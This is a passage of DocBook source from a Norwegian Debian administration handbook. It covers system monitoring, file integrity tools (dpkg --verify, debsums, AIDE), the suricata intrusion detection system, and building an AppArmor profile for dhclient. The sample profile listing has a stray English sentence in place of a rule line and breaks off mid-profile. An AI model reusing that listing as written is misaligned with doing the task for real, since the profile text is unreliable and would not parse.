	<para>Det finnes mange øremerkede verktøy for denne oppgaven. De fleste kan hente data via SNMP (<emphasis>Simple Network Management Protocol</emphasis>) for å sentralisere denne informasjonen. En ekstra fordel er at dette gjør at henting av data fra nettverkselementer som kanskje ikke er datamaskiner med et generelt formål, som øremerkede nettverksrutere eller brytere.</para>

	<para>Noe detaljert omhandler denne boken Munin (se <xref linkend="sect.munin" />) som en del av <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. Debian leverer også et lignende verktøy, <emphasis role="pkg">cacti</emphasis>. Utplasseringen er litt mer komplisert, siden det kun er basert på SNMP. Til tross for et nettgrensesnitt, kreves det litt innsats å få tak på begrepene som inngår i konfigurasjonen. Å lese HTML-dokumentasjon (<filename>/usr/share/doc/cacti/html/index.html</filename>) må betraktes som en forutsetning.</para>

        <sidebar>
          <title><emphasis>ALTERNATIV</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (i pakken med tilsvarende navn) er et eldre verktøy. Til tross for noen grove kanter, kan det samle historiske data og vise dem som grafer. Det inkluderer en rekke skript øremerket til å samle de mest overvåkede data som prosessorbelastning, nettverkstrafikk, nettsidetreff, og så videre.</para>

	  <para>Pakkene <emphasis role="pkg">mrtg-contrib</emphasis> og <emphasis role="pkg">mrtgutils</emphasis> inneholder eksempelskripter som kan brukes direkte.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Å finne endringer</title>

      <para>Når systemet er installert og konfigurert, og sikkerhetsoppgraderinger oppdatert, er det vanligvis ingen grunn til å utvikle videre de fleste filer og kataloger, data unntatt. Det er derfor interessant å sørge for at filene faktisk ikke endres: Alle uventede endringer vil det derfor være verdt å undersøke. Denne delen presenterer noen verktøy som er i stand til å overvåke filer, og advare administratoren når en uventet endring skjer (eller rett og slett for å liste slike endringer).</para>
      <section id="sect.dpkg-verify">
        <title>Gjennomgå pakker med <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>FOR VIDEREKOMMENDE</emphasis> Å beskytte mot oppstrømsforandringer</title>

	  <para><command>dpkg --verify</command> er nyttig for å oppdage endringer i filer som kommer fra en Debian-pakke, men vil være ubrukelig hvis pakken selv er kompromittert, for eksempel hvis Debian-speilet er kompromittert. Å beskytte mot denne typen angrep omfatter å bruke APTs digitale system for signaturverifisering (se <xref linkend="sect.package-authentication" />), og passe på å bare installere pakker med en sertifisert opprinnelse.</para>
        </sidebar>

        <para><command>dpkg --verify</command> (eller <command>dpkg -V</command>) er et interessant verktøy, siden det tillater å finne hvilke installerte filer som har blitt endret (potensielt av en angriper), men dette bør tas med en klype salt. For å gjøre jobben sin er den avhengig av sjekkesummer lagret i dpkgs egen database lagret på harddisken (de kan finnes i <filename>/var/lib/dpkg/info/<replaceable>pakke</replaceable>.md5sums</filename>); Derfor vil en grundig angriper oppdatere disse filene slik at de inneholder de nye kontrollsummene for nedbrutte filer.</para>

        <sidebar>
          <title><emphasis>DET GRUNNLEGGENDE</emphasis> Fil fingeravtrykk</title>
	  <indexterm><primary>fingeravtrykk</primary></indexterm>
	  <indexterm><primary>kontrollsum</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>Som en påminnelse: Et fingeravtrykk er en verdi, ofte et tall (om enn i heksadesimal notasjon), som inneholder en slags signatur for innholdet i en fil. Denne signaturen er beregnet med en algoritme (MD5 eller SHA1 er godt kjente eksempler) som mer eller mindre garanterer at selv den minste endring i filinnholdet innebærer en endring i fingeravtrykket; kjent som skredeffekten («avalanche effect»). Dette gjør at et enkelt tallfestet fingeravtrykk tjener som en lakmustest for å sjekke om innholdet i en fil har blitt endret. Disse algoritmene er ikke reverserbare; med andre ord, for de fleste, at man vet at et fingeravtrykk ikke tillater å finne tilbake til det tilhørende innholdet. Nye matematiske fremskritt ser ut til å svekke hvor absolutt disse prinsippene er, men det er ikke stilt spørsmålstegn ved bruken så langt, siden det å lage ulikt innhold ut fra samme fingeravtrykk fortsatt synes å være en ganske vanskelig oppgave.</para>
        </sidebar>

        <para>Å kjøre <command>dpkg -V</command> vil bekrefte alle installerte pakker, og vil skrive ut en linje for hver fil med en sviktende test. Utgangsformatet er det samme som et fra <command>rpm -V</command> hvor hver figur betegner en test med noen spesifikke metadata. Dessverre <command>dpkg</command> lagrer ikke metadata som trengs for de fleste testene, og vil dermed gi spørsmålstegn for dem. Foreløpig kan bare sjekksumtesten levere en «5»-er på det tredje tegnet (når den feiler).</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput>
</screen>
        <para>I eksempelet ovenfor, rapporterer dpkg en endring i SSH-tjenestefil som administratoren har gjort i den pakkede filen i stedet for å bruke den hensiktsmessige <filename>/etc/systemd/system/ssh.service</filename>-overstyring (som ville bli lagret under <filename>/etc</filename> som alle konfigurasjonsendringer skal). Den viser også flere konfigurasjonsfiler (identifisert av «c»-bokstaven i det andre feltet) som er legitimt modifisert.</para>
      </section>

      <section id="sect.debsums">
        <title>Overvåkingspakker: <command>debsums</command> og dens grenser</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> er stamfaren til <command>dpkg -V</command>, og er dermed stort sett foreldet. Den lider av de samme begrensningene som dpkg. Heldigvis, noen av begrensningene kan man komme rundt (mens dpkg ikke tilbyr tilsvarende work-arounds (muligheten)).</para>

        <para>Siden dataene på disken ikke er å stole på, <command>debsums</command> tilbyr å gjøre sine undersøkelser på grunnlag av <filename>.deb</filename>-filer i stedet for å stole på dpkgs database. For å laste ned pålitelige <filename>.deb</filename>-filer for alle installerte pakker, kan vi stole på APTs klarerte nedlastinger. Denne operasjonen kan være treg og omstendelig, og bør derfor ikke ansees som en proaktiv teknikk som skal brukes på jevnlig basis.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>
</screen>

	<para>Merk at dette eksemplet bruker <command>grep-status</command>-kommandoen fra <emphasis role="pkg">dctrl-tools</emphasis>-pakken, som ikke er installert som standard.</para>
      </section>
      <section>
        <title>Å overvåke filer: AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (Debian-pakke)</primary></indexterm>

	<para>AIDE-verktøyet (<emphasis>Advanced Intrusion Detection Environment</emphasis>) kan sjekke filens integritet, og oppdager alle endringer opp mot et tidligere innspilt bilde av systemet. Dette bildet er lagret som en database (<filename>/var/lib/aide/aide.db</filename>) som inneholder relevant informasjon om alle filene i systemet (fingeravtrykk, tillatelser, tidsstempler, og så videre). Denne databasen blir først initialisert med <command>aideinit</command>; og er så brukt daglig (med <filename>/etc/cron.daily/aide</filename>-skriptet) for å kontrollere om ingenting relevant er endret. Når det oppdages endringer, registrerer AIDE dem i loggfiler (<filename>/var/log/aide/*.log</filename>), og sender sine funn til administratoren med e-post.</para>

        <sidebar>
          <title><emphasis>I PRAKSIS </emphasis> Å beskytte databasen</title>

	  <para>Ettersom AIDE bruker en lokal database for å sammenligne tilstanden til filene, er gyldigheten av resultatene direkte knyttet til databasens gyldighet. Hvis en angriper får rot-rettigheter til et kompromittert system, vil denne være i stand til å skifte ut databasen og dekke sine spor. En mulig løsning ville være å lagre referansedata på skrivebeskyttede lagringsmedier .</para>
        </sidebar>

	<para>Mange valg i <filename>/etc/default/aide</filename> kan bli brukt til å justere handlingene til <emphasis role="pkg">aide</emphasis>-pakken. AIDE-oppsettet er lagret i <filename>/etc/aide/aide.conf</filename> og <filename>/etc/aide/aide.conf.d/</filename> (disse filene er faktisk bare brukt av <command>update-aide.conf</command> for å generere <filename>/var/lib/aide/aide.conf.autogenerated</filename>). Konfigurasjon indikerer hvilke egenskaper ved hvilke filer som må sjekkes. For eksempel kan innholdet i loggfiler endres rutinemessig, og slike endringer kan ignoreres så lenge rettighetene til disse filene forblir de samme, men både innhold og tillatelser for kjørbare programmer må være konstante. Selv om de ikke er veldig kompliserte, er ikke konfigurasjonssyntaksen helt intuitiv, og lese <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry>-manualside er derfor anbefalt.</para>

	<para>En ny versjon av databasen genereres hver dag i <filename>/var/lib/aide/aide.db.new</filename>; hvis alle registrerte endringer var legitime, kan den brukes til å erstatte referansedatabasen.</para>

        <sidebar>
          <title><emphasis>ALTERNATIV</emphasis> Tripwire og Samhain</title>

	  <para>Tripwire er veldig lik AIDE: Selv syntaksen til konfigurasjonsfilen er nesten den samme. Hovedtillegget, levert fra <emphasis role="pkg">tripwire</emphasis> er en mekanisme til å signere konfigurasjonsfilen, slik at en angriper ikke kan få den til å peke til en annen versjon av referansedatabasen.</para>

	  <para>Samhain tilbyr også lignende funksjoner, samt noen funksjoner for å hjelpe til med å oppdage rootkit (se sidepanelet <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). Den kan også distribueres globalt i et nettverk, og registrere sine spor på en sentral tjener (med en signatur).</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>HURTIGVISNING</emphasis> Pakkene <emphasis role="pkg">checksecurity</emphasis> og <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>Den første av disse pakkene inneholder flere små skript som utfører grunnleggende kontroller på systemet (tomme passord, nye setuid-filer og så videre), og advarer administratoren hvis nødvendig. Til tross for sitt eksplisitte navn, bør en administrator ikke stole utelukkende på det for å være sikker på at et Linux-system er trygt.</para>

	  <para>Pakkene <emphasis role="pkg">chkrootkit</emphasis> og <emphasis role="pkg">rkhunter</emphasis> tillater at det sees etter om <emphasis>rootkits</emphasis> potensielt er installert i systemet. Som en påminnelse; disse er biter av programvare utviklet for å skjule kompromittering av et system, og samtidig å holde kontrollen over maskinen. Testene er ikke 100 % pålitelige, men de kan som regel trekke administratorens oppmerksomhet til potensielle problemer.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Å avdekke inntrenging (IDS/NIDS)</title>
      <indexterm><primary>avdekke, inntrenging</primary></indexterm>
      <indexterm><primary>inntrenging avdekke</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>intrusion detection system</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>Nettverk</primary><secondary>IDS</secondary></indexterm>

      <sidebar>
        <title><emphasis>BACK TO BASICS</emphasis> Denial of service</title>
        <indexterm><primary>denial of service</primary></indexterm>

	<para>Et «tjenestenektangrep» har bare ett mål: Å gjøre en tjeneste utilgjengelig. Enten et slikt angrep innebærer å overbelaste tjeneren med henvendelser eller utnytte en feil, er sluttresultatet det samme: tjenesten er ikke lenger i drift. Vanlige brukere er misfornøyd, og enhetens vertsoppgaver nettverkstjenesten rammes, lider et tap i omdømme (og muligens i inntekter, for eksempel hvis tjenesten var en e-handel).</para>

	<para>Et slikt angrep er ofte «distribuert»: Dette innebærer vanligvis å overbelaste tjeneren med et stort antall henvendelser som kommer fra mange forskjellige kilder, slik at tjeneren blir ute av stand til å svare på legitime henvendelser. Disse typer angrep har fått kjente forkortelser: <acronym>DDoS</acronym> og <acronym>DoS</acronym> (avhengig av om tjenestenektangrepet er distribuert eller ikke).</para>
      </sidebar>

      <para><command>suricata</command> (i Debian-pakken med samme navn) er et NIDS - et <emphasis>Network Intrusion Detection System</emphasis>. Oppgaven er å lytte til nettverket, og prøve å oppdage infiltrasjonsforsøk og/ eller fiendtlige handlinger (inkludert tjenestenektangrep). Alle disse hendelsene blir logget i flere filer i <filename>/var/log/suricata</filename>. Det er tredjepartsverktøy (Kibana/logstash) som bedre kan søke igjennom alle innsamlede data. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>VÆR VARSOM</emphasis> Handlingsrom</title>

	<para>Effektiviteten til <command>suricata</command> er begrenset av trafikken som sees på det overvåkede nettverksgrensesnittet. Det vil åpenbart ikke være i stand til å oppdage noe, hvis det ikke kan observere den virkelige trafikken. Koblet til en nettverksvitsj, vil det derfor kun overvåke angrep mot maskinen det kjører på, som sannsynligvis ikke er intensjonen. Maskinens vertsoppgaver <command>suricata</command> bør derfor plugges til bryterens «speil»-port, som vanligvis er øremerket for kjedede brytere, og som derfor får all trafikk.</para>
      </sidebar>

      <para>Å sette opp suricata innebærer å gjennomgå og redigere <filename>/etc/suricata/suricata-debian.yaml</filename>, som er veldig lang fordi hvert parameter er rikelig kommentert. En minimal konfigurasjon krever beskrivelse av området med adresser som det lokale nettverket dekker (<literal>HOME_NET</literal>-parameter). I praksis betyr dette hele settet med mulige angrepsmål. Men å få det meste ut av den, krever å lese den i sin helhet, og tilpasse den til den lokale situasjonen.</para>
      <para>På toppen av dette, må du også redigere <filename>/etc/default/suricata</filename> for å definere nettverksgrensesnittet som skal overvåke, og å aktivere init-skript (ved å sette <literal>RUN=yes</literal>). Du kan også ønske å sette <literal>LISTENMODE=pcap</literal> fordi standard <literal>LISTENMODE=nfqueue</literal> krever ytterligere konfigurasjon for å fungere riktig (nettfilter brannmuren må konfigureres til å videresende pakker til en brukerområde-kø som håndteres av suricata via <literal>NFQUEUE</literal>-målet).</para>
      <para>For å oppdage feilaktig oppførsel trenger <command>suricata</command> et sett med overvåkingsregler: Du kan finne slike regler i <emphasis role="pkg">snort-rules-default</emphasis>-pakken. <command>snort</command> er den historiske referansen i IDS-økosystemet ,og <command>suricata</command> kan gjenbruke regler skrevet for den. Dessverre mangler denne pakken i <emphasis role="distribution">Debian Jessie</emphasis>, og bør hentes fra en annen Debian-utgivelse som <emphasis role="distribution">Testing</emphasis> eller <emphasis role="distribution">Unstable</emphasis>.</para>
      <para>Alternativt kan, <command>oinkmaster</command> (i pakken med samme navn) brukes til å laste ned Snort regelsett fra eksterne kilder.</para>
      <sidebar>
        <title><emphasis>FOR VIDEREKOMMENDE</emphasis> integrasjon med <command>prelude</command></title>

	<para>Prelude leverer sentralisert overvåking av sikkerhetsinformasjon. Den modulære arkitekturen inkluderer en tjener (<emphasis>manager</emphasis> i <emphasis role="pkg">prelude-manager</emphasis>) som samler varsler generert av <emphasis>sensorer</emphasis> av ulike typer.</para>

	<para>Suricata kan konfigureres som en slik sensor. Andre muligheter inkluderer <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) som overvåker loggfiler (på en måte som svarer til <command>logcheck</command>, beskrevet i <xref linkend="sect.logcheck" />).</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Introduksjon til AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>Prinsipper</title>
      <para>AppArmor er et <emphasis>Mandatory Access Control (obligatorisk adgangskontroll)</emphasis>-system (MAC- system) som bygger på Linux LSM (<emphasis>Linux Security Modules</emphasis>)-grensesnitt. I praksis spør kjernen AppArmor før hvert system kaller for å få vite om prosessen er autorisert til utføre den gitte operasjonen. Gjennom denne mekanismen begrenser AppArmor programmer til et begrenset sett med ressurser.</para>
      <indexterm><primary><emphasis>Obligatorisk adgangskontroll</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
      <para>AppArmor anvender et sett med regler (kjent som «profil») på hvert program. Profilen som kjernen bruker avhenger av installasjonsbanen til programmet som kjøres. I motsetning til SELinux (omtalt i <xref linkend="sect.selinux" />), er ikke reglene som brukes avhengig av brukeren. Alle brukere står overfor samme regelverk når de utfører samme program (men tradisjonelle brukertillatelser gjelder fortsatt, og kan resultere i ulik atferd!).</para>
      <para>AppArmor profiler er lagret i <filename>/etc/apparmor.d/</filename>, og de inneholder en liste over adgangskontrollregler om ressurser som hvert program kan gjøre bruk av. Profilene er kompilert og lastet inn i kjernen av <command>apparmor_parser</command>-kommandoen. Hver profil kan lastes enten i håndhevings- eller klagemodus. Den første håndhever politikk og rapporterer krenkingsforsøk, mens sistnevnte ikke håndhever politikken, men logger likevel systempåkallinger som ville ha blitt nektet.</para>
    </section>
    <section id="sect.apparmor-setup">
      <title>Å aktivere AppArmor og håndtere AppArmor-profiler</title>
      <para>AppArmor-støtte er bygget inn i Debians standardkjerner. Å aktivere AppArmor er dermed bare et spørsmål om å installere noen få pakker, og legge noen parametere til kjernens kommandolinje:</para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>Etter en omstart, virker AppArmor, og <command>aa-status</command> vil raskt bekrefte det:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput>
</screen>
      <sidebar>
        <title><emphasis>NOTE</emphasis> Flere AppArmor-profiler</title>
        <para>Pakken <emphasis role="pkg">apparmor-profiles</emphasis> inneholder profiler som forvaltes av oppstrøms AppArmor-samfunnet. For å få enda flere profiler du kan installere <emphasis role="pkg">apparmor-profiles-extra</emphasis> med profiler utviklet av Ubuntu og Debian.</para>
      </sidebar>
      <para>Tilstanden for hver profil kan veksle mellom håndheving og klager med anrop til <command>aa-enforce</command> og <command>aa-complain</command>, som gir som parameter enten banen til den kjørbare filen, eller til policy-filen. I tillegg kan en profil helt deaktiveres <command>aa-disable</command>, eller sette i revisjonsmodus (for å logge aksepterte systemanrop også) med <command>aa-audit</command>.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Å lage en ny profil</title>
      <para>Selv om det er ganske enkelt å opprette en AppArmor-profil, mangler de fleste programmer en. Denne seksjonen vil vise deg hvordan du oppretter en ny profil fra bunnen av, bare ved hjelp av målprogrammet, og ved å la AppArmor overvåke systemanropene det lager, og ressursene det har tilgang til.</para>
      <para>De viktigste programmene som trenger beskyttelse er nettverket som vender mot programmer, ettersom de er de mest sannsynlige mål for eksterne angripere. Det er derfor AppArmor beleilig nok tilbyr en <command>aa-unconfined</command>-kommando for å liste programmer som ikke har noen tilknyttet profil, og som eksponerer en åpen nettverkssocket. Med <literal>--paranoid</literal>-alternativet får du alle ubeskyttede prosesser med minst én aktiv nettverkstilkobling.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>I følgende eksempel vil vi derfor forsøke å opprette en profil for <command>/sbin/dhclient</command>. Til dette vil vi bruke <command>aa-genprof dhclient</command>. Den vil invitere deg til å bruke programmet i et annet vindu, og når du er ferdig, å komme tilbake til <command>aa-genprof</command> for å søke etter AppArmor-hendelser i systemloggene, og konvertere disse loggene til adgangsregler. For hver logget hendelse vil den lage ett eller flere regelforslag som du enten kan godkjenne eller redigere videre på flere måter:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput>
</screen>
      <para>Merk at programmet ikke viser tilbake kontrolltegnene du skriver, men for klarheten i forklaringen har jeg tatt dem med i den forrige utskriften.</para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>Den første oppdagede hendelsen er kjøring av et annet program. I så fall har du flere valg: Du kan kjøre programmet med profilen til den overordnede prosessen («Inherit»-valget), du kan kjøre den med sin egen dedikerte profil («Profile»- og «Named»-valgene, som bare avviker i  muligheten til å bruke et vilkårlig profilnavn), du kan kjøre den med en under-profil til den overordnede prosessen («Child»-valget), du kan kjøre den uten profil («Unconfined»-valget), eller du kan bestemme deg for å ikke kjøre i det hele tatt («Deny»-valget).</para>
          <para>Merk at når du velger å kjøre den under en øremerket profil som ikke finnes ennå, vil verktøyet opprette den manglende profilen for deg, og 
 lager regelforslag for den profilen i det samme løpet.</para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>På kjernenivå er de spesielle rettighetene til rotbrukeren delt etter «kvalifikasjone»". Når en systempåkalling krever en bestemt kvalifikasjon, vil AppArmor verifisere om profilen tillater programmet å bruke denne muligheten.</para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>Her søker programmet lesetillatelse for <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command> oppdaget at denne tillatelsen ble også gitt av flere «abstraksjoner», og tilbyr dem som alternative valg. En abstraksjon tilbyr et gjenbrukbart sett tilgangsregler som grupperer sammen flere ressurser som ofte brukes sammen. I dette konkrete tilfellet blir filen vanligvis nådd gjennom navnetjenestens relaterte funksjoner i C-biblioteket, og vi skriver «3» for først å velge «#include &lt;abstraksjoner/tjeneste&gt;»-valget og så «A» for å tillate det.</para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>Programmet vil opprette <filename>/run/dhclient-eth0.pid</filename>-filen. Hvis vi bare tillater å opprette denne bestemte filen, vil programmet ikke fungere når brukeren skal bruke det i et annet nettverksgrensesnitt. Derfor kan vi velge «Ny» for å erstatte filnavnet med det mer generiske «/run/dhclient*.pid» før regelen spilles inn med «Tillat».</para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>Legg merke til at denne tilgangsforespørselen ikke er en del av dhclient-profilen, men av den nye profilen som vi laget da vi tillot <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> å kjøre med sin egen profil.</para>
          <para>Etter å ha gått gjennom alle de loggede hendelsene, tilbyr programmet å lagre alle profilene som ble opprettet under kjøringen. I dette tilfellet har vi to profiler som vi sparer med én gang med «Lagre» (men du kan lagre dem enkeltvis også) før du forlater programmet med «Ferdig».</para>
        </callout>
      </calloutlist>
      <para><command>aa-genprof</command> er i realiteten bare et smart omslag rundt <command>aa-logprof</command>; den skaper en tom profil, laster den i klagemodus, og kjører deretter <command>aa-logprof</command>, som er et verktøy for å oppdatere en profil basert på profilovertredelsen som har blitt logget. Så du kan kjøre dette verktøyet igjen senere for å forbedre profilen du nettopp opprettet.</para>
      <para>Hvis du vil ha den genererte profilen komplett, bør du bruke programmet på alle måter det er legitimt å bruke det. Med dhclient betyr det å kjøre den via Network Manager, å kjøre den via ifupdown, å kjøre den manuelt, etc. Til slutt kan du få en <filename>/etc/apparmor.d/sbin.dhclient</filename> nær denne:</para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,
a profile based on the profile violations that have been logged.
  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
